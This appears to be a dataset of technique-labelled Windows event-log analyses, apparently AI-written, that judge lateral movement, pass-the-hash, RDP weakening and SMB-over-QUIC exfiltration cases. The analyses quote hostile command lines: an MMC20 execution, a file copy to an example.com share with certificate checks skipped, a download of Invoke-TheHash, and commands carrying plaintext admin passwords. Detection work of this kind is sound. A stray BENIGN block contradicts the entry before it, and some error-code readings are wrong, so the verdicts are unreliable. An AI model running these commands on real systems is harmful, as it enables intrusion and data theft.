Enable Windows Remote Management,"To assess the provided Windows event logs, I systematically reviewed each section looking for anomalous behavior, indicators of possible compromise, and any signs of malicious activity.

### Detailed Analysis:

#### Application Log:
- **Event ID 15**: Shows that Windows Defender is active, which is generally a positive indicator of a security measure in place rather than an anomaly.

#### Windows PowerShell Log:
- **Event ID 600**: Repeated entries show execution of a PowerShell command: `powershell.exe & {Enable-PSRemoting -Force}`.
  - **Enable-PSRemoting** is used to configure the computer to receive PowerShell remote commands, which can be legitimate in a managed environment but could also be exploited by attackers if not expected behavior.
  - **Anomaly**: This action is noteworthy because it enables remote management capabilities, which may represent a risk if unauthorized or unexpected.

#### System Log:
- **Windows Update Events (IDs 44, 43, 19)**: Indicate successful Security Intelligence Update for Microsoft Defender Antivirus. These updates are routine and indicate ongoing security maintenance.

#### Security Log:
- **Successful Logons (Event ID 4624)** and **Privilege Use (Event ID 4672)**: Show administrator-level actions and elevated privileges for user `admin_test` using NTLM authentication from workstation `DESKTOP-3HL5B2P`.
  - **Anomaly**: A high volume of privileged actions and NTLM use from an external IP and workstation, especially if these are unfamiliar or unrecognized, may warrant further investigation.

- **Credential Validation Failure (Event ID 5379)**: Shows multiple unsuccessful credential validations, potentially indicating failed login attempts or service probing.

#### Sysmon Log:
- **Event ID 1 and 5**: Routine execution of system processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and others by user `admin_test`, including hash checks, seem benign.
- **Noteworthy Event**: PowerShell process with `CommandLine=""powershell.exe & {Enable-PSRemoting -Force}""`. Similar to PowerShell logs, this could be standard admin action but may also represent unwanted configuration changes if not pre-approved.

### Assessment:
- The logs reveal an attempt to enable PowerShell Remoting with administrator privileges, which is significant if it wasn't planned by the IT team.
- The use of NTLM authentication from an external workstation, especially to perform privileged actions, is suspicious.
- The presence of credential validation failure events could suggest reconnaissance or password guessing attempts.

### Resolution:
- **SUSPICIOUS**

### Guidance on How to Proceed:
1. **Verify Legitimacy**: Check with the IT team regarding any authorized maintenance activities involving PowerShell Remoting and confirm user `admin_test` actions.
2. **Audit Access Control**: Re-evaluate who has permissions to execute high-privilege remote actions and restrict where NTLM can be used.
3. **Monitor Network Traffic**: Set alerts for unusual patterns, especially from unexpected IPs or workstations.
4. **Conduct User Verification**: Confirm if the logins and privileged access are necessary and recognize the legitimate user and their intent.
5. **Investigate Failed Logins**: Determine if the failed credential events are benign, due to misconfigurations, or potentially malicious activities.

Ensure the security configurations are consistently aligned with organization policies and consider further forensic analysis if additional anomalies surface or unauthorized actions are confirmed."
PowerShell Lateral Movement using MMC20,"Upon reviewing the event logs provided, the following points stand out and can help in determining the nature of activities observed:

### Windows PowerShell logs:
1. **Unusual PowerShell Execution:**
   - The command line involves using `[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""localhost"")).Document.ActiveView.ExecuteShellCommand(""c:\\windows\\system32\\calc.exe"", $null, $null, ""7"")`.
   - This script invokes Microsoft Management Console (MMC) to execute the Calculator application. 
   - Although the command itself isn't inherently malicious, this technique of using PowerShell with such scripts can be indicative of potential evasive or non-standard usage, typically seen in scripting attacks or lateral movement exploits.

### Sysmon logs:
2. **Multiple wevtutil.exe and conhost.exe Usage:**
   - The user `SERVER002\admin_test` appears to have initiated processes `wevtutil.exe` and `conhost.exe` multiple times around the same timestamps. 
   - `wevtutil.exe` is commonly used to query or delete event logs and could be part of a script or automated task running under this user account. However, repeated execution in short order can be a red flag for potential log clearing activities.

3. **Windows PowerShell and calc.exe:**
   - The Sysmon logs corroborate the PowerShell activity, showing execution with the same PowerShell and MMC script leading to starting calc.exe.

4. **Microsoft Edge and Windows Update Activities:**
   - There are several entries surrounding `MicrosoftEdgeUpdate.exe` and `MpSigStub.exe` which are consistent with update operations, typical for antivirus and browser updates.
   - Windows Update and AntiMalware updates are evident, providing authenticity of actions via Microsoft-signed binaries.

### Security logs:
5. **Logon Events and Privilege Assignments:**
   - There is evidence of potentially high privilege assigned to `SERVER002\admin_test` with privileges like `SeDebugPrivilege`, which could lead to unauthorized actions if exploited, though it is not uncommon for administrator accounts.
   
6. **Multiple Credential Events:**
   - Event IDs 5379 indicate potentially unsuccessful credential operations related to the Microsoft Account, returning error codes, which could hint at attempted access or sync issues.

### Assessment:
- The execution of a PowerShell command to leverage MMC for starting calc.exe is atypical and merits scrutiny, as it might indicate testing or misuse of command execution capabilities.
- The repeated and batched execution of `wevtutil.exe` and `conhost.exe` suggests the possibility of automated actions. Such activity could be benign if part of a scheduled or scripted action by an administrator or suspicious if attempts were made to clean or manipulate logs rapidly.
- Windows Update and Microsoft Edge Update events appear benign and typical of regular system maintenance routines.

### Final Resolution: **SUSPICIOUS**
- Although there are no explicit confirmations of malicious actions, the unusual PowerShell command and the concentrated use of event-log-related commands lean towards behavior requiring further investigation to rule out malicious intentions.
- Recommendation includes verifying the `admin_test` account activities for legitimacy and inspecting change management records for any correlating authorized actions, while potentially setting alerts for repetitive or unusually timed commands. Further investigation into the script or scheduled tasks that could explain this behavior should follow."
Exfiltration Over SMB over QUIC (NET USE),"In the analysis of the provided logs, several points stand out which may raise concern:

1. **Time Synchronization Events**: Multiple time changes are evident in the Security and System logs. While these changes could result from normal time synchronization activities, it's essential to verify whether these frequent changes are expected or result from malicious activities. The events show `svchost.exe` managing time changes which align with Windows Time Service operation.

2. **PowerShell Usage**: A PowerShell command was executed with the following command: `powershell.exe & {NET USE * '\\example.com\sales' /TRANSPORT:QUIC /SKIPCERTCHECK, copy 'C:\path\to\file.txt' '*:\'}`. This command includes:
   - **NET USE**: It maps a network share using QUIC and skips certification checks, which can potentially bypass network security restrictions.
   - **SKIPCERTCHECK**: This indicates an intentional bypass of certificate validation, raising a red flag for malicious intent, such as man-in-the-middle attacks.
   - **File Copy**: The command attempts to copy a file to what appears to be a network-mapped drive. Without more context, this might involve data exfiltration.

3. **System and Sysmon Event Logs**: Notable processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` run by an administrative user, but these are not inherently malicious. However, their presence, along with event logging utilities, could suggest an attempt to interact with or manipulate log data.

4. **Microsoft Edge Update**: There are numerous entries regarding `MicrosoftEdgeUpdate.exe` running with system-level privileges. This could be benign related to normal Edge update processes, but the frequency and nature should be corroborated with a schedule of expected updates to rule out misuse.

5. **Temporal Correlation of Events**: Most events happen in quick succession (around `15:03:58` and a similar period). The timings for PowerShell activities and network mappings are noteworthy and could suggest coordinated actions.

**Assessment**:
Considering the points above, there are elements that suggest potentially anomalous behavior. The presence of command-line arguments like `/SKIPCERTCHECK` with PowerShell execution, the rapid series of administrative and system-level processes, and time changes point towards possible suspicious activities. Further context, such as the known behavior of the involved user account(s), scheduled job listings, and network activity details, are vital to make a more definitive determination.

**Resolution**: **SUSPICIOUS**
- The activities do not incontrovertibly present as malicious, but their nature and context necessitate further investigation, particularly into the PowerShell command usage and time alterations. Ensure proper auditing and enhance monitoring around these activities. Consider conducting a thorough review of network traffic, particularly targeting data exfiltration activities, access logs, and user behavior analytics.

**Guidance**:
- Check with IT regarding any legitimate PowerShell scripts or automated tasks.
- Confirm the legitimate schedule for any Edge updates or time synchronization tasks.
- Cross-reference network logs for any file transfers to external networks, especially those involving skipped cert checks.
- Reiterate endpoint security measures, and ensure command line auditing is generating detailed logs.
- Gather additional details about the user `admin_test` and their recent activities on the system."

### Final Assessment

- **Overall Risk Categorization:** **BENIGN**
- **Rationale:** The logs analyzed do not exhibit overtly malicious activities. Most events align with typical update cycles, system maintenance, and legitimate user activity. There are no definitive indicators of compromise or unauthorized privilege escalation.

### Guidance on Proceeding

- **Monitoring:** Continue to review logs regularly, and implement alerts for repetitive or unusual patterns, especially with credential access and time changes.
- **Verification:** Verify that the `admin_test` user account is authorized and aligns with current administrative practices.
- **Routine Review:** Regularly update threat detection rules to capture any newly emerging threats that may not be evident under current configurations.

Implementing these measures should ensure any suspicious activity is promptly addressed while maintaining normal system operations."
Rubeus Kerberos Pass The Ticket,"Upon analyzing the provided logs, there is a clear indication of suspicious activity that warrants further investigation. Here are the key observations:

1. **PowerShell Script Execution**:
   - Multiple events in the Windows PowerShell log reveal execution of an external script located in a temporary directory, `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\script.exe""`. This script was executed with elevated privileges (`-accepteula`) and involved operations suggestive of ticket granting operations (TGT and TGS with Kerberos).
   - The series of commands executed involve file manipulations and network communication using a potentially administrative credential (`/user:Administrator /password:Password`). Using administrative credentials in scripts, particularly in this context, likely indicates an attempt to escalate privileges or move laterally within the network using harvested credentials.

2. **Sysinternals Tools Usage**:
   - The Sysmon logs show the execution of `PSEXESVC.exe` and the addition of the PSEXESVC service, often associated with remote or unauthorized control of systems due to its origin from the Sysinternals suite.
   - `PSEXESVC.exe` is executed as a service under the `LocalSystem` account, indicating high-level permissions, which is a common tactic used in lateral movement or remote execution by threat actors.

3. **Kerberos and Credential Harvesting**:
   - Commands within the PowerShell activity suggest attempts to interact with Kerberos tickets, potentially indicative of ""Pass the Ticket"" or other credential theft techniques.
   - Files like `""ticket.kirbi""` are temporary files used in conjunction with Kerberos activities, further supporting credential-based malicious activities.

4. **Additional Processes**:
   - The presence of processes like `wevtutil.exe` could suggest attempts to interact with or clear event logs, a common evasion technique.
   - Execution of commands such as `whoami.exe` and `hostname.exe` may indicate enumeration activities typical in situational awareness for further attack planning.

5. **Edge Update Activity**:
   - Multiple entries related to Microsoft Edge Update processes do not appear suspicious by themselves, as they are typically related to system maintenance, unless involved in atypical network communication or invoked from unusual contexts.

Based on this analysis, the behavior represents indicators of potential malicious activity, notably indicative of lateral movement and credential harvesting techniques often employed in advanced attacks or red team exercises. However, full confirmation requires further corroboration with network logs, response actions, or additional host data.

### Resolution: **MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Response**: Isolate the affected host (`Server002`) from the network to prevent further lateral movement or data exfiltration.
- **Further Investigation**: Review additional logs such as Security Event logs, network traffic, and other endpoints for signs of compromise.
- **Credential Security**: Reset credentials for accounts observed in the logs (especially those with administrative privileges) and verify the integrity of the authentication mechanisms.
- **Remediation**: Conduct a thorough investigation to ensure all traces of the malicious activities are removed and validate that no persistence mechanisms are in place.
- **Incident Report**: Document findings in an incident report and review internal security controls to mitigate future risks."
Remote Code Execution with PS Credentials Using Invoke-Command,"After analyzing the provided logs, here's a detailed breakdown of the findings:

### Security Logs:
1. **Event ID 4634, 4624, 4672:**
   - A user `admin_test` logged in from `DESKTOP-3HL5B2P` using NTLM authentication (Event ID 4624).
   - Privileges associated with the `admin_test` account include `SeDebugPrivilege` among others, which can be concerning if the event is unexpected for this user (Event ID 4672).
   - The account `admin_test` was logged off shortly afterward.

2. **Event ID 5379:**
   - Multiple events indicate failed credential fetching for `MicrosoftAccount:user=02txoixylodcstop`. The return code `3221226021` suggests a failed operation, which might indicate credential access attempts that could be anomalous if these are not typical for the environment.

3. **Anonymous Logons:**
   - There are logon and logoff events for `ANONYMOUS LOGON` (Event IDs 4624 and 4634). This could be normal in the case of anonymous access to certain network shares, but it should be reviewed if it is unexpected.

### PowerShell Logs:
- **PowerShell Execution (Event ID 600):**
  - The command executed includes `Enable-PSRemoting -Force` followed by `Invoke-Command` to run `whoami` remotely, which, while not inherently malicious, can reflect lateral movement behavior if not executed by an authorized admin.

### Sysmon Logs:
- **Processes Executed by admin_test:**
  - Multiple executions of standard Windows binaries (`wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `powershell.exe`). The processes executed aren't inherently suspicious but should be contextually reviewed if `admin_test` typically executes such commands.

- **PowerShell with Remoting:**
  - Entry reflects an execution of PowerShell with remote commands, matching PowerShell logs, suggesting administrative activity but should require validation against change management or typical administrative behavior.

### Application and System Logs:
- **Updates and Defender State:**
  - Updates and state changes for the Windows Defender are logged (Event IDs 15, 43, 44, 19). These are normal and indicate standard operations for security and updates.

### Assessment:
- **BENIGN Events:**
  - Windows Update and Windows Defender activity appears routine.
  
- **SUSPICIOUS Elements:**
  - PowerShell command execution enabling remote tasks might indicate suspicious administrative actions.
  - The `NTLM` authentication with high privileges is concerning in environments where such logins are unexpected and might require attention.
  - Repeated failed credential operations for Microsoft accounts are generally anomalies that require understanding the context.

### Final Resolution: SUSPICIOUS
The provided logs contain activities suggesting potentially unwanted behavior, particularly around the execution of PowerShell for remote commands and suspicious administrative privileges that could suggest insider threats or compromised accounts. Further investigation is necessary to verify whether these actions were authorized, expected, and do not represent lateral movement or privilege escalation attempts.

### Recommended Actions:
1. Verify if the `admin_test` actions were authorized or part of expected behavior.
2. Check for any unauthorized changes in access permissions.
3. Review firewall and network logs for unusual accesses corresponding with logon activities.
4. Engage with users or administrators involved in the logged activities to validate legitimate access.
5. Implement enhanced monitoring on the `admin_test` account and similar privileged accounts for future activities."
Disable NLA for RDP via Command Prompt,"Upon reviewing the provided Windows event logs, several observations can be made:

1. **Time Changes**:
   - There are multiple logs associated with time changes (`EventID: 1` under Kernel-General and Security Audit ID 4616). While time adjustments are normal for synchronization purposes, the repeated and rapid succession of these changes is noteworthy. The `OldTime` switches back and forth in quick succession, which can be suspicious as attackers sometimes alter system times to evade logging or to alter log perceptions.

2. **Privilege Activity**:
   - Event ID 4672 shows the assignment of special privileges to `admin_test`. These privileges include ones that grant significant control over the system, such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others commonly associated with sensitive operations.
   - Multiple logons (`EventID: 4624`) utilize the NTLM authentication type for `admin_test` which is less secure compared to Kerberos and often targeted in attacks.

3. **Command Execution**:
   - There are events indicating the execution of `cmd.exe` with the command that modifies registry settings related to RDP authentication (`reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f`). Changes to RDP settings, especially if they disable user authentication, are highly suspect as it weakens security controls potentially allowing unauthorized access.

4. **Unexpected and Repeated Utility Invocation**:
   - Multiple invocations of utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `reg.exe` by `admin_test` user are observed. The execution of these tools sequentially and rapidly potentially indicates script or tool utilization typical in an environment where configuration changes or system reconnaissance is being automated.

5. **Patterns in Security Logs**: 
   - The use of high-integrity level processes by `admin_test` and access to RDP-related registry edits suggest actions characteristic of establishing persistent backdoor access.
   - Consistent with the above, EventID 5379 with status code `3221226021` indicates failed credential operations, which could indicate a validation process or injection attempt.

**Assessment**:
The log analysis reveals anomalous behavior, especially the registry alterations concerning RDP settings which are significant red flags for malicious activity. Coupled with suspicious usage of high-privilege processes and changes, there is substantial evidence to suggest malicious activity, especially in the potential attempt to weaken system access controls and carry out unauthorized actions.

**Resolution**: MALICIOUS
- **Threats/Risks Identified**: Risk of unauthorized access potentially leveraging weak or unauthorized RDP configurations, script or tool-based automation of malicious intent, and high privilege operations that may be prelude to further exploitation.
- **Guidance to Proceed**:
   - Isolate the affected system `Server002` to prevent potential further access or spreading.
   - Review and enforce RDP policies to ensure enhanced authentication practices are in place.
   - Conduct a thorough examination of user `admin_test` activities and any associated accounts potentially compromised.
   - Evaluate similar systems in the network for identical behavior or configurations.
   - Strengthen endpoint security settings, focusing on audit, detection, and response capabilities."
crackmapexec Pass the Hash,"Upon reviewing the provided event logs, several activities raise concerns and should be investigated further:

1. **Time Discrepancy:**
   - The security logs indicate a clock change on the system. Event ID 4616 appears to show two instances where the system time was altered. Unexpected time changes can sometimes be indicative of attempts to bypass security protocols or cover tracks (e.g., alter time-stamped log files).

2. **Privileged Account Use:**
   - The `admin_test` account was noted for usage with a significant set of privileges (Event ID 4672), including `SeDebugPrivilege`, which can be suspicious if there is no legitimate administrative task being conducted. Elevated privileges like `SeDebugPrivilege` can allow an attacker to bypass system-level security checks.

3. **NTLM Authentication:**
   - The account `admin_test` logged in using NTLM authentication (Event ID 4624) from a remote desktop (stated as DESKTOP-3HL5B2P). While not inherently suspicious, this could be unusual if NTLM is not typically used or if remote access from such workstations is not common in the organization.

4. **Use of PowerShell and CMD:**
   - There is a sequence showing the execution of `powershell.exe`, `wevtutil.exe`, and `cmd.exe` associated with the `admin_test` account, executing potentially suspicious command-line scripts from a temporary directory (Sysmon Event IDs indicate the launching of these processes). The execution of scripts and use of `wevtutil.exe` could be leveraged to clear logs or make unauthorized changes.

5. **Edge Update Process:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` running, particularly from temporary directory paths (Sysmon logs). Although it might be part of a legitimate update, its repetitive nature and execution location could hint towards attempts to execute potentially malicious payloads disguised as updates.

Given these observations, the general assessment of these logs indicates:

- **Resolution: SUSPICIOUS**

The logs contain activity that doesn't align with typical processes expected on a secured system and should be scrutinized further. The time discrepancies, privileged account use from unverified locations, and irregular process executions all point towards activities that deserve a detailed investigation. 

**Guidance on How to Proceed:**
1. Review the purpose and recent changes related to the `admin_test` account and validate all activities associated with it.
2. Investigate the workstation `DESKTOP-3HL5B2P` for any signs of compromise.
3. Conduct a malware scan and ensure the integrity of critical systems, focusing on the execution of any unauthorized hosted scripts or temporary directory executions.
4. Audit and potentially reconfigure system time-change policies and monitor such activities closely in the future.
5. Ensure NTLM authentication usage is aligned with organizational policies or explore more secure alternatives like Kerberos.
6. Reach out to your IT team to check on Edge-related updates during the specified timeframe to confirm if these were sanctioned updates or potentially malicious executions.

Further, examining the processes and scripting activities utilized during these times can potentially reveal any security breaches or unauthorized activities leveraging these tools."
WinRM Access with Evil-WinRM,"Upon analyzing the provided logs, several key observations can be made:

1. **Security Logs:**
   - Several `EventID 5379` indicate that the system attempted to retrieve credentials but failed with error code `3221226021` which translates to `STATUS_LOGON_FAILURE`.
   - `EventID 4624` show successful logons which were system-level logons (`LogonType 5`) and utilize the `Advapi` process, indicating they are service-related.
   - `EventID 4672` signifies special privileges being assigned during these logons, but they pertain to the `SYSTEM` account, which is standard for service operations.

2. **Sysmon Logs:**
   - Multiple instances of `powershell.exe` are executed by the user `SERVER002\admin_test`. This pattern reflects potentially suspect behavior, especially given the sensitive nature of PowerShell and the command line used.
   - A specific instance of PowerShell execution (`EventID 1`, `ProcessId 4392`) raises a red flag due to inclusion of plaintext credentials in the command (`-u Domain\Administrator -p P@ssw0rd1`).
   - `wevtutil.exe` and `conhost.exe` processes are frequently spawned, possibly suggesting log manipulation or command execution.
   - Various service management operations are logged, which may simply denote routine system/service updates.

3. **Windows PowerShell Logs:**
   - Logs reflect PowerShell activity as started and stopped without detailed scripting activity, but reference the same suspicious command line identified in the Sysmon logs.

4. **General Observations:**
   - The logs show a pattern of system processes operating under the `NT AUTHORITY\SYSTEM` account, likely indicative of standard operations and updates.
   - The plaintext password usage in a PowerShell command suggests a significant misstep in credential management and could be exploited by malicious insiders or external bad actors.

### Assessment:
The standout anomaly within these logs is the use of PowerShell with hardcoded domain administrator credentials. This indicates potential misuse or misconfiguration that poses a significant security risk, as it trivially exposes sensitive credentials.

### Final Resolution: MALICIOUS

Given the clear presence of credentials being mismanaged and exposed via PowerShell command, the behavior in these logs indicates malicious intent or highly negligent security practices that could lead to or facilitate a compromise. Immediate steps should include:
1. Changing the exposed credentials and reviewing any potential compromises of the domain administrator account.
2. Conduct a thorough review and audit of PowerShell execution policies and scripts to ensure alignment with best security practices.
3. Monitor and restrict the use of sensitive credentials directly in scripts or command lines moving forward."
Invoke-WMIExec Pass the Hash,"Upon reviewing the provided event logs, here is the detailed analysis of the findings:

### Suspicious or Anomalous Behavior:

1. **Frequent Use of Wevtutil and Conhost**:
   - The continuous usage of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test` seems unusual. While these utilities are legitimate Windows components, excessive or unexpected use can be suspicious, often indicative of someone attempting to manipulate event logs or manage console windows, potentially to cover tracks.

2. **PowerShell Script Execution**:
   - A PowerShell instance is launched with a command that includes an encoded script from a public URL (`'https://raw.githubusercontent.com/script/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/script.ps1'`). This could be a potential malicious script being executed on the system. PowerShell is a common vector for attacks due to its powerful scripting capabilities.

3. **Execution of Hostname and Whoami**:
   - Commands like `hostname.exe` and `whoami.exe` are executed, potentially as reconnaissance actions to gather information about the system and user context.

4. **Time Change Events (Event ID 4616)**:
   - The logs indicate a time discrepancy, which got corrected, showing potential manipulation (backdating of logs) by the process `svchost.exe`. Such changes can be done for malicious purposes to hide activities within specific timeframes or evade detection systems that rely on timestamps.

### Indicators of Malicious Activity:

- The PowerShell command specifically poses a significant threat due to its nature of loading code from the internet and executing it. This behavior aligns with tactics used in various forms of attacks, including fileless malware attacks and credential harvesting.

- The execution of `wevtutil.exe` alongside unexpected use of `conhost.exe`, combined with PowerShell access to external scripts, can indicate attempts to obfuscate logs, execute scripts covertly, or escalate privileges.

### Assessment and Resolution:

Based on the findings, the resolution for this situation is **MALICIOUS**. The PowerShell activity coupled with potential log manipulation using `wevtutil.exe` suggests an ongoing or attempted compromise of this host.

### Guidance on How to Proceed:

1. **Immediate Isolation**: Isolate the affected host from the network to prevent further spread of any potential threat.

2. **Detailed Forensic Analysis**: Conduct a deeper forensic investigation on the isolated host to gather more details about the malicious actions and the impact.

3. **Review and Revert Changes**: Check for any unauthorized changes to the system, especially in the event logs or system time configurations, and revert as necessary.

4. **Examine Network Logs**: Investigate any network connections to and from the host, particularly to the external IPs or domains involved in the PowerShell execution.

5. **Patch and Update**: Ensure that all systems are up to date with the latest patches and security updates to mitigate known vulnerabilities.

6. **Review Security Configurations**: Look into the security configurations and tighten any weak spots such as user permissions, PowerShell script execution policies, and event log monitoring settings.

7. **User Education & Awareness**: Educate the user `SERVER002\\admin_test` and other users on recognizing potentially malicious activities and proper security hygiene. 

By taking these remediation steps, further compromise can be minimized, and additional insights into the current system state can be achieved."
Map admin share,"**Analysis Summary:**

Upon reviewing the provided logs, several aspects need to be considered to ascertain whether there are indicators of malicious activity or any other anomalies:

1. **System Log Observations:**
   - The system log shows Windows Update Client activities related to updates for Microsoft Defender Antivirus. These events, dated to 2024, appear to be routine antivirus definition updates (KB2267602). This is a common and expected behavior on Windows systems to ensure antivirus capabilities remain current.

2. **Sysmon Log Observations:**
   - Sysmon logs cover a variety of processes initiated around the same timeframe. Noteworthy:
     - Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows utility for managing event logs; however, its usage should be monitored for potential abuse. 
     - The execution of `cmd.exe` with potentially risky command-line arguments indicating a network share access attempt using administrator credentials: `net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator`. This action is suspicious as it implies an attempt to access another machine's administrative share programmatically.

3. **Security Log Observations:**
   - Security logs show a sequence of events that include logon and privilege assignment to `admin_test`. Event ID 4672 shows elevated permissions, which might be legitimate for an administrative account but nonetheless needs scrutiny.
   - Multiple log-on/log-off activities within a short time period, which could be indicative of a scripted or automated process or even unauthorized access attempts.

4. **Application Log Observations:**
   - The application log shows a report that Windows Defender is on and operational, ensuring an active antivirus presence on the system.

**Assessment:**

The logs provided denote generally routine system updates and operations, with one potentially significant deviation: the suspicious execution of a command to map a network share using administrative credentials. While the `wevtutil.exe` and `conhost.exe` show high usage, they could be benign due to their frequent use in legitimate logging and command-line interface operations. However, the network share access attempt especially with credentials in plaintext within the command-line history pose an immediate security risk.

**Conclusion:**

Based on the provided evidence and its context:
- **Resolution: SUSPICIOUS**

**Recommendations:**

- Perform a deep dive into the purpose and origin of the `cmd.exe` command to access the network share with administrative credentials. Investigate whether this was authorized or bears any relation to legitimate administrative tasks.
- Check for similar patterns or evidence of unauthorized access attempts in other logs not provided here.
- Consider alerting to similar activity in real-time using your SIEM system to prevent potential lateral movement across assets.
- Immediately change credentials and enforce a review of access logs from the target machine to ensure unauthorized access is not ongoing or has already happened.
- Conduct a security review of audit logs to identify if any other accounts are being used in a similar capacity.
- Strengthen security policies by enforcing stronger password management and utilizing multifactor authentication.

These steps aim to mitigate potential unauthorized access and prevent misuse of administrative credentials. Further investigation should help confirm whether this event is isolated or part of a larger security incident."
Radmin Viewer Utility,"Upon analyzing the provided Windows event logs, here is the detailed analysis focusing on any suspicious or anomalous behavior:

1. **Microsoft Edge Update Activity**:
   - There are multiple events related to the ""MicrosoftEdgeUpdate.exe"" application. The process seems to be involved in updating or installing components related to Microsoft Edge. These activities include running executables such as ""MicrosoftEdgeUpdate.exe"" with various command line arguments like `/update`, `/regsvc`, `/regserver`, `/svc`, and `/ping`, indicating typical update-related activities.

2. **Privilege Level and User Context**:
   - The ""MicrosoftEdgeUpdate.exe"" processes are run by `NT AUTHORITY\SYSTEM`, which is normal for system-services like an updater.
   - PowerShell and command prompt activities observed are executed under the user `SERVER002\admin_test`. Exploring processes such as ""wevtutil.exe"" and ""conhost.exe"" under administrative context require further review due to potential misuse.

3. **PowerShell and CMD Usage**:
   - The presence of ""powershell.exe"" and ""cmd.exe"" processes is noted. While these are common tools in Windows environments, they are also frequently leveraged for malicious purposes. The execution of cmd.exe with a command line referencing `Radmin Viewer 3`, a remote administration tool, is a point of interest. Admin use of such tools may be regular, but could also indicate lateral movement attempts or persistent footholds established by an attacker.

4. **Application Log Entries**:
   - A ""Service stopped"" event for ""edgeupdate"" is logged. This aligns with normal updater service termination upon completion and doesn't inherently indicate malicious activity.

5. **Other System Processes**:
   - The presence of processes like ""TiWorker.exe"" and ""TrustedInstaller.exe"" is typical for system maintenance and Windows Updates, appearing to suggest legitimate system activities.

**Assessment**:
- **Suspicious Elements**:
  - **Radmin Tool Usage**: The invocation of `Radmin Viewer 3` indicates potential remote management activity, which could be legitimate or abused by an attacker for remote access without the user's knowledge.
  - **Wevtutil Executions**: Frequent triggering of ""wevtutil.exe"" by an admin account, especially when paired with other characteristic admin tools like PowerShell, can be a red flag for log-capture or deletion attempts by malicious entities.

Given these findings and the potential for misuse of administrative tools and third-party remote access software, the logs should be flagged as requiring additional scrutiny.

**Resolution**: **SUSPICIOUS** - The logs contain activity that doesn't look entirely benign and needs further investigation, particularly regarding the usage of remote access tools and command line utilities by administrative accounts. Further checks should include reviewing the legitimacy of `Radmin Viewer 3` usage on the system, confirming whether it is part of authorized IT infrastructures, along with a deeper inspection of related network connections and user actions during this timeframe."
Map Admin Share PowerShell,"### Detailed Analysis

In reviewing the provided logs, I have analyzed the different elements for any indicators of suspicious or malicious behaviors. Here is a breakdown of key findings from each log:

#### System Log
- Time Synchronization: Logs showing time was adjusted (`EventID: 24` and `EventID: 1`). Time synchronization is typical, but if manipulated by malicious actors, it can indicate an attempt to hide activities. The changes here seem minor and contextually expected, possibly for daylight saving adjustments.
- Windows Update: Normal update process for Microsoft Defender Antivirus (`EventID: 44` and `EventID: 43`) does not appear suspicious.

#### Windows PowerShell Log
- PowerShell Activity: Execution of a PowerShell command to create a new drive (`New-PSDrive` command). This command maps to a network share. While mapping network shares can be benign, it can also be used in lateral movement or data exfiltration by attackers. This action might require further scrutiny, especially since it lacks authorization or approval in a secure environment.

#### Sysmon Log
- Regular System Processes: Most activities, including `wevtutil.exe`, `conhost.exe`, and Windows updates, are legitimate parts of typical system operations.
- `powershell.exe`: Executed a script using `New-PSDrive` to mount a network share, aligning with the PowerShell log findings. Further investigation into the legitimacy of the network path and user's intent is recommended.
- Edge Update: Microsoft Edge was updated, which appears benign as updates are common and expected.

#### Security Log
- Privileged Account Usage: User `admin_test` has logged in and has several high privileges (e.g., `SeDebugPrivilege`). An account abusing such privileges could be indicative of malicious insider activity or account compromise, especially if this usage pattern is unexpected.
- NTLM Logon: Legitimate NTLM authentication occurred, which appears consistent.

### Assessment and Resolution
The logs indicate regular system behavior for the most part. However, the PowerShell activity and usage of `admin_test` with high privileges are slightly out of the normal patterns and warrant some degree of caution.

- **Time Synchronization and Updates**: No issues noted, appears to be benign system administration.
- **PowerShell Commands and Elevated Privileges**: The use of admin privileges and mapping network drives should be verified to ensure that these actions align with standard operational procedures and are well-documented by system administrators or authorized users.
  
**Guidance and Further Actions**
- Investigate the PowerShell command to determine its intent, and verify the legitimacy of the network path targeted.
- Ensure `admin_test` actions are authorized and consistent with typical behavior.
- Implement heightened monitoring around this account and evaluate audit logs for other unusual patterns over a longer period.

### Final Resolution: **SUSPICIOUS**
The logs predominantly reveal benign activity, but certain actions such as network drive mapping using PowerShell by a privileged account call for further investigation to rule out potential misuse or malicious activity."
Exfiltration Over SMB over QUIC (New-SmbMapping),"Upon reviewing the provided Windows event logs, I noted various entries containing information about process creations and modifications on a system named ""Server002"". Here's a detailed analysis of the logs, highlighting key points and assessing potential threats:

**1. Process Creation Patterns:**
- **Processes Observed:** The logs frequently show processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, `PowerShell`, and `MicrosoftEdgeUpdate.exe`. These are typical system utilities or update tools.
  
- **PowerShell Execution:** A substantial point of interest is the PowerShell command `powershell.exe & {New-SmbMapping -RemotePath '\\\\example.com\\sales' -TransportType QUIC -SkipCertificateCheck, copy 'C:\\path\\to\\file.txt' 'Z:\\'}`. This attempts to create an SMB mapping, which is not inherently malicious but could indicate data transfer activity, especially the `-SkipCertificateCheck` flag used in the command, which is somewhat unusual and could be risky if misused.

**2. Indicators of Known Malicious Activity:**
- **High Integrity Level Processes:** Specific high integrity level activities include system management and administrative tasks, but their existence is not, by itself, threatening. Notably, the PowerShell command executed with a high integrity level could be a potential concern, mainly when combined with network operations.

- **Scheduled or Repeated Execution:** Multiple instances of Microsoft Edge Update processes (e.g., `MicrosoftEdgeUpdate.exe`) are seen multiple times, suggesting routine update activities, which appear legitimate.

**3. Sysmon and Security Logs:**
- No explicit security alerts or unauthorized user entries. The security logs involve changes in system times, which generally align with system operations like adjusting NTP for time synchronization, but no direct evidence points to malicious tampering.
 
**4. Application and System Logs:**
- These logs reveal updates or service start/stop events related to routine operations for applications such as Microsoft Edge Update, further substantiating the benign intent of logged activities.

**Findings and Recommendations:**
